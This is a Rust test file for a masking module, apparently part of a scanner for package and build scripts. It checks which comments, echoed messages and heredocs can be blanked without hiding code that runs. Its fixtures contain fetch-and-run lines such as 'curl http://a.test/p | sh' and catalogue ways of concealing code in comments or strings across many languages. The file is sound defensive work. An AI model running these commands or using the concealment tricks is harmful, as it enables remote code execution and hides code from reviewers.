//! Tests for `mask`.

use super::lines;

fn code(rel: &str, text: &str) -> Vec<String> {
    lines(rel, text)
        .into_iter()
        .map(|line| line.code.trim_end().to_string())
        .collect()
}

fn quiet(rel: &str, text: &str) -> Vec<String> {
    lines(rel, text)
        .into_iter()
        .map(|line| line.quiet.trim_end().to_string())
        .collect()
}

#[test]
fn lines_stay_aligned_with_the_original() {
    let text = "a\n# b\r\n\necho 'c\nd'\n";
    assert_eq!(lines("x.sh", text).len(), text.lines().count());
    assert_eq!(lines("x.py", text).len(), text.lines().count());
    assert_eq!(lines("x.c", text).len(), text.lines().count());
}

#[test]
fn shell_comments_are_blanked_but_not_hashes_in_words_or_strings() {
    assert_eq!(
        code(
            "PKGBUILD",
            "# see http://a.test\nx=1 # sudo y\necho \"#no\" ${#arr} a#b\n"
        ),
        ["", "x=1", "echo \"#no\" ${#arr} a#b"]
    );
}

#[test]
fn printed_messages_are_quiet_but_still_code() {
    let text = "post_install() {\n  echo 'sudo rm -rf /var/log/x/'\n  printf '%s\\n' \\\n    \"  sudo /usr/lib/x.sh\"\n}\n";
    assert_eq!(
        quiet(".INSTALL", text),
        ["post_install() {", "  echo", "  printf", "", "}"]
    );
    assert!(code(".INSTALL", text)[1].contains("sudo"));
    assert_eq!(quiet("x.sh", "echo 'sudo a' >&2\n"), ["echo"]);
    assert_eq!(
        quiet("x.sh", "echo 'sudo a' >&2x\n")[0],
        "echo 'sudo a' >&2x"
    );
}

#[test]
fn multi_line_echo_strings_are_quiet() {
    let text = "echo \"\nadd this to ~/.bashrc:\n  echo 'source x' >> ~/.bashrc\n\"\nsudo true\n";
    assert_eq!(quiet("x.install", text), ["echo", "", "", "", "sudo true"]);
}

#[test]
fn printed_text_that_is_consumed_or_expanded_stays_visible() {
    for text in [
        "echo 'sudo x' | sh\n",
        "echo 'source x' >> ~/.bashrc\n",
        "echo \"$(sudo id)\"\n",
        "echo `sudo id`\n",
        "eval \"$(echo sudo x)\"\n",
        "printf -v cmd 'sudo %s' x\n",
        "x=$(echo 'sudo y')\n",
    ] {
        assert_eq!(quiet("x.sh", text)[0], text.trim_end(), "{text:?}");
    }
}

#[test]
fn nothing_is_quiet_when_printed_output_may_run() {
    for prelude in [
        "echo() { eval \"$@\"; }\n",
        "function printf { eval \"$1\"; }\n",
        "shopt -s expand_aliases\nalias echo=eval\n",
        "f() { echo x; }\nf | sh\n",
        "{ echo x >&2; } 2>&1 | /bin/bash\n",
        "exec 2> >(sh)\n",
        "exec >/tmp/x.sh\n",
        "g | xargs -I{} sh -c {}\n",
        "f | sudo -E bash\n",
        "f | env FOO=1 sh -s\n",
    ] {
        let text = format!("{prelude}echo 'sudo a'\ncat <<EOF\nsudo b\nEOF\n");
        let quiet = quiet("x.sh", &text).join("\n");
        assert!(
            quiet.contains("sudo a") && quiet.contains("sudo b"),
            "{prelude:?}"
        );
    }
    // Ordinary pipes and `||` leave messages quiet.
    let text = "ls | grep x || echo 'sudo a'\necho_x() { :; }\necho y | sudo tee /etc/x\n";
    assert!(!quiet("x.sh", text).join("\n").contains("sudo a"));
}

#[test]
fn statements_after_a_message_are_not_quiet() {
    assert_eq!(
        quiet("x.sh", "echo hi && sudo a; echo b || sudo c\n"),
        ["echo    && sudo a; echo   || sudo c"]
    );
    assert_eq!(
        quiet("x.sh", "if x; then echo 'sudo a'; fi\n"),
        ["if x; then echo         ; fi"]
    );
}

#[test]
fn printed_heredocs_are_quiet_and_others_are_not() {
    let printed = "cat <<EOF\n  sudo systemctl enable x\nEOF\nsudo y\n";
    assert_eq!(quiet("x.sh", printed), ["cat <<EOF", "", "EOF", "sudo y"]);

    for text in [
        "cat > /etc/x <<EOF\nsudo a\nEOF\n",
        "sh <<'EOF'\nsudo a\nEOF\n",
        "cat <<EOF | sh\nsudo a\nEOF\n",
        "cat <<EOF\n$(sudo a)\nEOF\n",
    ] {
        assert!(quiet("x.sh", text)[1].contains("sudo"), "{text:?}");
    }
    // A quoted delimiter prints `$(...)` literally.
    assert_eq!(quiet("x.sh", "cat <<'EOF'\n$(sudo a)\nEOF\n")[1], "");
}

#[test]
fn many_heredocs_on_one_line_stay_linear() {
    let text = "cat ".to_string() + &"<<E ".repeat(500_000);
    let started = std::time::Instant::now();
    assert_eq!(lines("x.sh", &text).len(), 1);
    assert!(started.elapsed().as_secs() < 10, "{:?}", started.elapsed());
}

#[test]
fn heredoc_bodies_are_not_lexed_as_shell() {
    // The apostrophe in the body must not open a quote.
    let text = "cat > f <<EOF\ndon't\nEOF\n# comment\n";
    assert_eq!(code("x.sh", text), ["cat > f <<EOF", "don't", "EOF", ""]);
    // Arithmetic shifts are not heredocs.
    assert_eq!(code("x.sh", "x=$((1<<2))\n# c\n"), ["x=$((1<<2))", ""]);
}

#[test]
fn pkgbuild_homepage_and_sources_are_quiet() {
    assert_eq!(
        quiet(
            "PKGBUILD",
            "url=\"http://a.test\"\nsource=(\"x.deb::http://b.test/x\"\n        \"http://c.test/y\")\nsource_x86_64=(\"http://d.test/z\")\n"
        ),
        ["", "", "", ""]
    );
    // Anything that runs a command stays visible.
    for text in [
        "source=(\"$(curl -s http://a.test/list)\")\n",
        "url=`curl http://a.test`\n",
        "source=(\"http://a.test/x\") > /tmp/x\n",
    ] {
        assert!(quiet("PKGBUILD", text)[0].contains("http://"), "{text:?}");
    }
    assert_eq!(
        quiet("other.sh", "url=\"http://a.test\"\n")[0],
        "url=\"http://a.test\""
    );
}

#[test]
fn full_line_comments_in_other_languages() {
    assert_eq!(
        code("a.py", "# http://x\nos.system(x)  # c\n"),
        ["", "os.system(x)  # c"]
    );
    assert_eq!(
        code(
            "a.c",
            "/*\n * http://www.apache.org/licenses/LICENSE-2.0\n */ int x;\n// eval(\nf(\"//\");\n"
        ),
        ["", "", "    int x;", "", "f(\"//\");"]
    );
    assert_eq!(
        code(
            "a.lua",
            "-- os.execute(x)\n--[[\nos.execute(y)\n]] f()\nos.execute(z)\n"
        ),
        ["", "", "", "   f()", "os.execute(z)"]
    );
    let diff = "--- a/x.sh\n+++ b/x.sh\n-sudo a\n+sudo b\n+# sudo c\n # sudo d\n-curl x | sh\n";
    assert_eq!(
        quiet("fix.patch", diff),
        ["--- a/x.sh", "+++ b/x.sh", "", "+sudo b", "", "", ""]
    );
    // A reversed patch runs the removed lines.
    assert_eq!(code("fix.patch", diff)[6], "-curl x | sh");
    // `#` is only a comment where the patched language says so.
    assert_eq!(
        code("fix.patch", "+++ b/x.c\n+#define X system(y)\n")[1],
        "+#define X system(y)"
    );
    // `#` is not a comment in C.
    assert_eq!(code("a.c", "#define X 1\n"), ["#define X 1"]);
}

#[test]
fn scripts_are_recognised_by_their_interpreter() {
    assert_eq!(code("run", "#!/usr/bin/env bash\n# x\n"), ["", ""]);
    assert_eq!(code("run", "#!/usr/bin/python3\n# x\n"), ["", ""]);
    assert_eq!(
        code("run", "#!/usr/bin/node\n# x\n"),
        ["#!/usr/bin/node", "# x"]
    );
}

#[test]
fn comments_stay_comments_and_own_output_is_followed() {
    // A comment that names a path or an address is still a comment.
    assert_eq!(
        code("a.js", "// http://a.test/docs\n// src/main.rs runs sudo\n"),
        ["", ""]
    );
    // The other lines of a block comment are passed over even when
    // its first one stays visible.
    let block = code(
        "a.js",
        "/* uses ${x} here\n * never run sudo\n */\nrun();\n",
    );
    assert!(block[0].contains("uses"));
    assert_eq!(block[1..], ["", "", "run();"]);
    // A backtick alone in a comment (ordinary in documentation) makes
    // it no less of one.
    assert_eq!(code("a.js", "/** Runs `sudo x`. */\n"), [""]);
    // An expansion left open over a line end is still one.
    assert!(code("x.sh", ": ${x:=\n #}; curl http://a.test/p | sh\n")[1].contains("curl"));
    // What one of the file's own functions prints, kept or run.
    for rest in [
        "gen | tee t.sh\n",
        "gen | cat > t.sh\n",
        "for i in 1; do gen; done | tee t.sh\n",
        "exec 3>t.sh\ngen >&3\n",
        "x=$(gen); echo \"$x\" > t.sh\n",
        "eval \"$(gen)\"\n",
        "source <(gen)\n",
        "gen|tee t.sh\n",
        "gen&>t.sh\n",
        "true&&gen | sudo tee t.sh\n",
        "gen | tee a.log b.sh\n",
        "x=`gen`; sh -c \"$x\"\n",
    ] {
        let text = format!("gen() {{\n  echo 'sudo a'\n}}\n{rest}");
        assert!(quiet("x.sh", &text).join("\n").contains("sudo a"), "{rest}");
    }
    // Many functions and many lines are read in one pass.
    let mut long: String = (0..20_000)
        .map(|index| format!("f{index}() {{ echo a; }}\n"))
        .collect::<Vec<_>>()
        .concat();
    long.push_str(&"echo b\n".repeat(20_000));
    // And one line of very many statements.
    long.push_str(&"f1;".repeat(100_000));
    long.push('\n');
    long.push_str(&"f1|".repeat(100_000));
    long.push('\n');
    long.push_str(&">".repeat(100_000));
    long.push_str("&2\n");
    long.push_str(&"> ".repeat(100_000));
    long.push('\n');
    long.push_str(&">|".repeat(100_000));
    long.push('\n');
    let started = std::time::Instant::now();
    assert_eq!(lines("x.sh", &long).len(), 40_005);
    assert!(started.elapsed().as_secs() < 30);
    // Whatever the file is called: a shell runs a `.txt` as well.
    for rest in ["gen \"$@\" 2>&1 | tee build.log\n", "gen > usage.txt\n"] {
        let text = format!("gen() {{\n  echo 'sudo a'\n}}\n{rest}");
        assert!(quiet("x.sh", &text).join("\n").contains("sudo a"), "{rest}");
    }
    // An address or a path after `//` with something before it.
    assert_eq!(code("a.js", "//https://a.test/x | sh\n"), [""]);
    assert!(code("a.js", "//$HOME/bin/curl http://a.test | sh\n")[0].contains("curl"));
}

#[test]
fn what_a_shell_runs_is_not_passed_over_as_a_comment_or_a_message() {
    // A `#` inside a parameter expansion starts no comment.
    assert_eq!(
        code(
            "x.sh",
            ": ${x:= #}; curl http://a.test | sh\necho ${#y} # note\n"
        ),
        [": ${x:= #}; curl http://a.test | sh", "echo ${#y}"]
    );
    // A line of `//` that reads as a path is a command to a shell.
    assert_eq!(
        code(
            "build.js",
            "//usr/bin/curl http://a.test | sh\n// a note\n//TODO later\n"
        ),
        ["//usr/bin/curl http://a.test | sh", "", ""]
    );
    let patch = "+++ b/build.c\n+//usr/bin/curl http://a.test | sh\n+// a note\n";
    assert!(code("fix.patch", patch)[1].contains("curl"));
    assert!(code("fix.patch", patch)[2].trim().is_empty());
    // A block comment with an expansion in it may be template text.
    assert!(code("a.js", "/* ${run()} */\n")[0].contains("run()"));
    // `url=x command` runs the command.
    assert!(quiet("PKGBUILD", "url=x curl http://a.test/p\n")[0].contains("curl"));
    // What a function or a loop prints into a file may be run next.
    for text in [
        "gen() {\n  echo 'sudo a'\n}\ngen > t.sh\nsh t.sh\n",
        "for i in 1; do echo 'sudo a'; done > t.sh\n",
        "{ echo 'sudo a'; } >> t.sh\n",
    ] {
        assert!(
            quiet("x.sh", text).join("\n").contains("sudo a"),
            "{text:?}"
        );
    }
    // To the terminal or to nowhere it stays a message.
    for text in [
        "warn() {\n  echo 'sudo a'\n}\nwarn >&2\n",
        "for i in 1; do echo 'sudo a'; done >/dev/null\n",
    ] {
        assert!(
            !quiet("x.sh", text).join("\n").contains("sudo a"),
            "{text:?}"
        );
    }
}

const RUN: &str = "require('child_process').exec('curl http://a.test/p | sh');";

/// Whether the local rules still read a line of `text` that holds `needle`.
fn shows(rel: &str, text: &str, needle: &str) -> bool {
    code(rel, text).iter().any(|line| line.contains(needle))
}

#[test]
fn a_block_opener_inside_a_string_hides_nothing() {
    for (rel, text) in [
        // Never closed: nothing after it was read.
        ("a.js", format!("const note = `\n/*\n{RUN}\n`;\nlet x = 1;\n")),
        // Closed inside a second string: the code between them was not.
        (
            "a.js",
            format!("const a = `\n/*\n`;\n{RUN}\nconst b = `\n*/\n`;\n"),
        ),
        // In a template string inside an expression of another.
        (
            "a.js",
            format!("const a = `x ${{ `\n/*\n` }} y`;\n{RUN}\nconst b = `\n*/\n`;\n"),
        ),
        // A string a `\` carries over the line.
        (
            "a.js",
            format!("const a = '\\\n/*';\n{RUN}\nconst b = '\\\n*/';\n"),
        ),
        (
            "a.c",
            "const char *s = \"\\\n/*\";\nint main(void) { system(\"curl http://a.test/p | sh\"); }\n".to_string(),
        ),
        // A raw string in Go, where `\` escapes nothing.
        (
            "a.go",
            "var a = `\\`\nvar b = `\n/*\n`\nfunc init() { exec.Command(\"sh\", \"-c\", \"curl http://a.test/p | sh\").Run() }\n".to_string(),
        ),
        // A string in Rust runs over lines as it is.
        (
            "build.rs",
            "const A: &str = \"\n/*\n\";\nfn main() { Command::new(\"sh\").arg(\"curl http://a.test/p | sh\"); }\n".to_string(),
        ),
    ] {
        assert!(shows(rel, &text, "curl http://a.test/p | sh"), "{rel}: {text:?}");
    }
    // A `//` line in a template string is its text, an expansion included.
    assert!(shows(
        "a.js",
        "const a = `\n// ${require('child_process').exec('curl x | sh')}\n`;\n",
        "curl x | sh"
    ));
}

#[test]
fn block_comments_are_still_passed_over_where_code_is_read() {
    assert_eq!(
        code(
            "a.js",
            "const a = `/* text */ ${b} it's`;\nconst c = '/*', d = \"//\";\n/*\n curl x | sh\n*/ e();\n  /* curl y | sh */ f();\n"
        ),
        [
            "const a = `/* text */ ${b} it's`;",
            "const c = '/*', d = \"//\";",
            "",
            "",
            "   e();",
            "                    f();"
        ]
    );
    // A division, a lifetime and a character are no strings.
    assert_eq!(
        code(
            "a.js",
            "let h = w / 2 + `${w / 2}px`;\n/*\ncurl x | sh\n*/\n"
        )[2],
        ""
    );
    assert_eq!(
        code(
            "a.rs",
            "fn f<'a>(x: &'a str) -> char { '\"' }\n/* /* curl x | sh */\ncurl y | sh */ g();\n"
        ),
        [
            "fn f<'a>(x: &'a str) -> char { '\"' }",
            "",
            "               g();"
        ]
    );
    // A comment that opens after code is left alone, as it was.
    assert_eq!(
        code("a.c", "int x; /*\ncurl x | sh\n*/\n")[1],
        "curl x | sh"
    );
}

#[test]
fn nothing_is_a_block_comment_once_what_is_read_cannot_be_told() {
    let hidden = "/*\n`;\nrun('curl http://a.test/p | sh');\nconst z = `\n*/\n`;\n";
    for (rel, start) in [
        // A regular expression with a quote in it, then a template string.
        ("a.js", "const r = /'/; const s = `'\n"),
        ("a.js", "const r = x.replace(/`/g, ''); const s = `\n"),
        // Markup, whose text is not code.
        ("a.jsx", "const e = <p>it`s</p>; const s = `\n"),
    ] {
        let text = format!("{start}{hidden}");
        assert!(
            shows(rel, &text, "curl http://a.test/p | sh"),
            "{rel}: {text:?}"
        );
    }
    for (rel, text) in [
        // `*\` and `/` on the next line close a comment in C.
        ("a.c", "/* a *\\\n/ system(\"curl x | sh\");\n/*\n*/\n"),
        ("a.c", "/* a *\\  \n/ system(\"curl x | sh\");\n/*\n*/\n"),
        // A raw string ends where its own delimiter says.
        (
            "a.cpp",
            "auto s = R\"x(\n)\" /*\n)x\"; system(\"curl x | sh\");\n/*\n*/\n",
        ),
        // What a false condition leaves out is not read in C#.
        (
            "a.cs",
            "#if false\n/*\n#endif\nProcess.Start(\"curl x | sh\");\n#if false\n*/\n#endif\n",
        ),
        // Java reads `\u000a` as a line break before anything else.
        (
            "A.java",
            "// \\u000a Runtime.getRuntime().exec(\"curl x | sh\");\n",
        ),
        (
            "A.java",
            "/* \\u002a\\u002f Runtime.getRuntime().exec(\"curl x | sh\");\n*/\n",
        ),
        // A line break `str::lines` does not split at ends a `//` comment.
        ("a.js", "// note\rrun('curl x | sh');\n"),
        ("a.js", "// note\u{2028}run('curl x | sh');\n"),
        // Strings in three quotes are each language's own.
        (
            "a.kt",
            "val a = \"\"\"\n/*\n\"\"\"\nfun f() = run(\"curl x | sh\")\nval b = \"\"\"\n*/\n\"\"\"\n",
        ),
    ] {
        assert!(shows(rel, text, "curl x | sh"), "{rel}: {text:?}");
    }
    // A `//` line is still a comment then, unless it may hold code.
    assert_eq!(
        code(
            "a.jsx",
            "const e = <p>a</p>;\n// curl x | sh\n// ${run()}\n"
        ),
        ["const e = <p>a</p>;", "", "// ${run()}"]
    );
}

#[test]
fn what_is_not_followed_is_given_up_on_before_it_hides_a_line() {
    for (rel, text) in [
        // `#![…]` in Rust is code, not the name of an interpreter.
        ("a.rs", "#![doc = \"\n/* \"] fn main() { run(); }\n// */\n"),
        ("a.rs", "#![doc = \"\n// \"] fn main() { run(); }\n"),
        // A regular expression after a word the language keeps.
        (
            "a.js",
            "export default /`/;\nconst s = `\n/* `; run();\n// */\n",
        ),
        (
            "a.js",
            "class A extends /`/ {}\nconst s = `\n/* `; run();\n// */\n",
        ),
        // Markup, however its first tag is written.
        ("a.jsx", "export default <div>\n/* </div>; run();\n// */\n"),
        ("a.jsx", "const e = <_A>\n/* </_A>; run();\n// */\n"),
        ("a.jsx", "const e = < div>\n/* </div>; run();\n// */\n"),
        ("a.jsx", "const e = <_A>\n// </_A>; run();\n"),
        ("a.jsx", "const e = <p>\n// {run()}\n</p>;\n"),
        ("a.scala", "val x = <a>\n/* </a>; run()\n// */\n"),
        // A regular expression over lines in Swift.
        ("a.swift", "let r = #/\na\n/* b\n/#; run()\n// */\n"),
        // Line breaks of C#, and of Scala before anything else is read.
        ("a.cs", "// note\u{85}run();\n"),
        ("a.scala", "// \\u000a run()\n"),
    ] {
        assert!(shows(rel, text, "run()"), "{rel}: {text:?}");
    }
}

#[test]
fn a_comment_line_that_may_close_a_string_stays_visible_once_unsure() {
    for (rel, text) in [
        ("a.kt", "val a = \"\"\"\n// \"\"\"; run()\n"),
        ("A.java", "String s = \"\"\"\n// \"\"\"; run();\n"),
        ("a.swift", "let a = \"\"\"\n// \"\"\"; run()\n"),
        ("a.dart", "var a = '''\n// '''; run();\n"),
        ("a.cs", "var s = @\"\n// \"; run();\n"),
        ("a.cpp", "const char* s = R\"(\n// )\"; run();\n"),
        ("a.c", "int n = 1'000; char *s = \"a\\\n// \"; run();\n"),
        ("a.rs", "let a = r\"x\";\nlet s = \"\n// \"; run();\n"),
        ("a.jsx", "const e = <p>a</p>;\nconst s = `\n// `; run();\n"),
        ("a.ts", "const r = /'/;\nconst s = `\n// `; run();\n"),
        ("a.go", "// '''\nvar s = `\n// `; var _ = run()\n"),
        // A block comment is not passed over then, so its end is not known.
        ("a.cs", "#if X\n#endif\n/*\n// */ run();\n"),
    ] {
        assert!(shows(rel, text, "run()"), "{rel}: {text:?}");
    }
}

#[test]
fn each_thing_the_reader_follows_is_needed() {
    // Hidden: the third line is a comment, whatever stands before it.
    for (rel, start) in [
        ("a.js", "#!/usr/bin/env node '\n"),
        ("a.js", "const a = `\\``;\n"),
        ("a.js", "const h = a[0] / 2 + 'px';\n"),
        ("a.js", "if (a <= b << c) d = `x`;\n"),
        ("a.js", "// a --> b, it's\n"),
        ("a.kt", "val a = \"${b}\" + 'c'\n"),
        ("a.h", "/* a banner \\\n   that runs on */\n"),
        ("a.h", "#define A(x) do { x; } \\\n  while (0)\n"),
    ] {
        let text = format!("{start}/*\ncurl x | sh\n*/\n");
        assert!(!shows(rel, &text, "curl x | sh"), "{rel}: {text:?}");
    }
    assert_eq!(
        code("a.kt", "/* a /* b */ curl x | sh */ run()\n"),
        ["                            run()"]
    );
    // A `//` line in a comment that opened after code, or after a mark at
    // the start of the file.
    assert_eq!(
        code("a.c", "int x; /*\n// curl x | sh\n// a */ y();\n"),
        ["int x; /*", "", "        y();"]
    );
    assert_eq!(
        code("a.hpp", "\u{feff}/*M//\n// curl x | sh\n//M*/\n")[1],
        ""
    );

    // Shown: without what the first line needs, the `/*` would hide a line
    // that runs.
    for (rel, text) in [
        // Braces inside an expression of a template string.
        (
            "a.js",
            "const a = `${ {a: 1} + `\n/*\n` }`;\nrun();\nconst b = `\n*/\n`;\n",
        ),
        // A string cut off at the end of the line is not carried on.
        ("a.js", "const a = '\n/*';\nrun();\nconst b = '\n*/';\n"),
        // Comments of their own in a script a page loads.
        ("a.js", "<!-- `\nconst s = `\n/* `; run();\n// */\n"),
        ("a.js", "--> `\nconst s = `\n/* `; run();\n// */\n"),
        // A trigraph for `\`.
        ("a.c", "char *s = \"??/\" \\\n/* \"; run();\n// */\n"),
        // Splices that join a comment marker or a raw string's letter.
        (
            "a.c",
            "int x = 1; /\\\n* a */ char *s = \"\\\n/* \"; run();\n// */\n",
        ),
        ("a.cpp", "auto s = R\\\n\"(\";\n/*\n)\"; run();\n/*\n*/\n"),
        ("a.cpp", "auto s = R\"(\";\n/*\n)\"; run();\n/*\n*/\n"),
        // Three quotes that pair up on their line.
        (
            "a.kt",
            "val a = \"\"\" \"\n/*\n\"\"\"; run()\nval b = \"\"\" \"\n*/\n\"\"\"\n",
        ),
        (
            "a.dart",
            "var a = ''' '\n/*\n'''; run();\nvar b = ''' '\n*/\n''';\n",
        ),
    ] {
        assert!(shows(rel, text, "run()"), "{rel}: {text:?}");
    }
}

#[test]
fn each_give_up_is_needed_on_its_own() {
    for (rel, text) in [
        // Where no markup may be written, so nothing else gives up first.
        ("a.ts", "<!-- `\nconst s = `\n/* `; run();\n// */\n"),
        ("a.ts", "/* a */ --> `\nconst s = `\n/* `; run();\n// */\n"),
        ("a.ts", "const r = /'/;\nconst s = `\n// ${run()}\n`;\n"),
        // A trigraph for `^`, which is no quote.
        (
            "a.c",
            "int x = a ??' b + '\"' + \"\\\n/* \"; run();\n// */\n",
        ),
        // XML after a word, and its other openings.
        ("a.scala", "val x = if c then <a>\n/* </a>; run()\n// */\n"),
        (
            "a.scala",
            "val x = if c then <_a>\n/* </_a>; run()\n// */\n",
        ),
        (
            "a.scala",
            "val x = if c then <?a?>\n/* <a/>; run()\n// */\n",
        ),
        // A `//` comment a splice carries on: the `/*` after it opens nothing.
        ("a.c", "// note \\\n/*\nrun();\n// */\n"),
        ("a.c", "int x; // note \\\n/*\nrun();\n// */\n"),
        ("a.c", "int x; /\\\n/ \\\n/*\nrun();\n// */\n"),
        // A brace in a regular expression inside a template's expression.
        (
            "a.js",
            "const a = `${ x.replace(/}/, 1) +\n`\n/*\n` }`;\nrun();\nconst b = `\n*/\n`;\n",
        ),
        // Raw strings that close on their line, a `\` in them being one.
        (
            "a.cs",
            "var a = @\"\\\"; var b = @\"\n/* \"; run();\n// */\n",
        ),
        (
            "a.cs",
            "var a = $@\"\\\"; var b = @\"\n/* \"; run();\n// */\n",
        ),
        (
            "a.rs",
            "let a = r#\"\\\"#; let b = \"\n/* \"; run();\n// */\n",
        ),
        // A quote as a character in Rust.
        ("a.rs", "let c = '\\\"'; let s = \"\n/* \"; run();\n// */\n"),
        // Two strings cut off at the ends of their lines.
        ("a.js", "x = don't\ny = isn't\n/*\nrun()\n*/\n"),
        ("a.c", "x = don't\ny = isn't\n/*\nrun()\n*/\n"),
        // What ends a regular expression in Swift.
        ("a.swift", "let r = #/\n// a /#; run()\n"),
        // A path stays a command once unsure.
        ("a.js", "const r = /'/;\n//usr/bin/run() http://a.test\n"),
    ] {
        assert!(shows(rel, text, "run()"), "{rel}: {text:?}");
    }
}

#[test]
fn what_the_reader_follows_does_not_make_it_give_up() {
    for (rel, start) in [
        ("a.js", "if (f() <= b) c = f() << 2;\n"),
        ("a.js", "const a = 'x\\\ny';\n"),
        (
            "a.c",
            "wchar_t *a = L\"x\"; char *b = u8\"x\"; f(u\"x\", U\"x\");\n",
        ),
        ("a.c", "char *a = \"a\\\nb\";\n"),
        ("a.go", "var a = `x\ny`\n"),
        ("a.rs", "let a = (b\"x\", c\"y\", b'z');\n"),
        ("a.rs", "impl<'a> X {}\n"),
        ("a.rs", "let a = \"x\ny\";\n"),
    ] {
        let text = format!("{start}/*\ncurl x | sh\n*/\n");
        assert!(!shows(rel, &text, "curl x | sh"), "{rel}: {text:?}");
    }
    assert_eq!(
        code("a.scala", "/* a /* b */ curl x | sh */ run()\n"),
        ["                            run()"]
    );
}
